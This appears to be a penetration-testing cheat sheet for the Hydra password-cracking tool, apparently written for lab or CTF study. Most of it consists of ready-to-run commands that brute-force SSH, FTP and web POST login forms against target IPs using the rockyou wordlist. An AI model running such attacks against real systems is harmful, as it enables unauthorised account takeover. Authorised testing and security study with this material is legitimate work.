# Hydra

## 🔑 Overview

Hydra is a **brute-force online password cracking tool** that runs through a wordlist to attack authentication services — SSH, web application forms, FTP, SNMP and more.

| Resource | Link |
|----------|------|
| Kali tools reference | [en.kali.tools/?p=220](https://en.kali.tools/?p=220) |
| GitHub repository | [github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra) |

### Installation

```bash
# Ubuntu / Debian
apt install hydra

# Fedora
dnf install hydra
```

---

## ⚙️ Flags Reference

| Flag | Description |
|------|-------------|
| `-l` | Single username for login |
| `-L` | File containing a list of usernames |
| `-p` | Single password |
| `-P` | File containing a list of passwords |
| `-t` | Number of parallel threads |
| `-V` | Verbose — show every login attempt |
| `-s` | Custom port (if service runs on a non-default port) |

---

## 🔐 SSH Brute Force

```bash
hydra -l <username> -P <passwordFile> <targetIP> -t 4 ssh
```

**Example — brute force root over SSH with 4 threads:**

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -t 4 ssh
```

| Part | Meaning |
|------|---------|
| `-l root` | Target SSH username is `root` |
| `-P rockyou.txt` | Try every password in `rockyou.txt` |
| `10.10.10.1` | Target machine IP |
| `-t 4` | Run 4 parallel threads |
| `ssh` | Target protocol |

---

## 🌐 Web Form Brute Force (POST)

> **Tip:** Check whether the login form uses GET or POST by inspecting the request in browser developer tools or the page source.

### Syntax

```bash
hydra -l <username> -P <passwordFile> <targetIP> http-post-form "<path>:<login_credentials>:<invalid_response>"
```

### Parameter Breakdown

| Parameter | Description | Example |
|-----------|-------------|---------|
| `-l` | Single username for the web form | `-l molly` |
| `-P` | Password wordlist | `-P /usr/share/wordlists/rockyou.txt` |
| `http-post-form` | Specifies a POST type form | — |
| `<path>` | URL path to the login page | `/login` or `login.php` |
| `<login_credentials>` | Form field names — `^USER^` and `^PASS^` are Hydra placeholders | `username=^USER^&password=^PASS^` |
| `<invalid_response>` | String that appears in the response when login **fails** | `F=incorrect` |
| `-V` | Verbose — print every attempt | `-V` |

### Example — POST form brute force

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.190.148 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

**What this does, step by step:**

| Part | Meaning |
|------|---------|
| `-l molly` | Target username is `molly` |
| `-P rockyou.txt` | Try every password in the rockyou wordlist |
| `10.112.190.148` | Target machine IP |
| `http-post-form` | Form uses POST method |
| `/login` | Login page is at `/login` |
| `username=^USER^&password=^PASS^` | Hydra injects the username and password into these form fields |
| `F=incorrect` | If the response contains the word *incorrect*, the login failed |
| `-V` | Print every attempt to the terminal |

---

## 📋 Quick Reference

```bash
# SSH — single user, wordlist
hydra -l root -P rockyou.txt 10.10.10.1 -t 4 ssh

# SSH — user list, wordlist
hydra -L users.txt -P rockyou.txt 10.10.10.1 -t 4 ssh

# Web POST form
hydra -l admin -P rockyou.txt 10.10.10.1 \
http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

# FTP
hydra -l admin -P rockyou.txt 10.10.10.1 ftp

# Custom port (e.g. SSH on port 2222)
hydra -l root -P rockyou.txt 10.10.10.1 -s 2222 -t 4 ssh
```
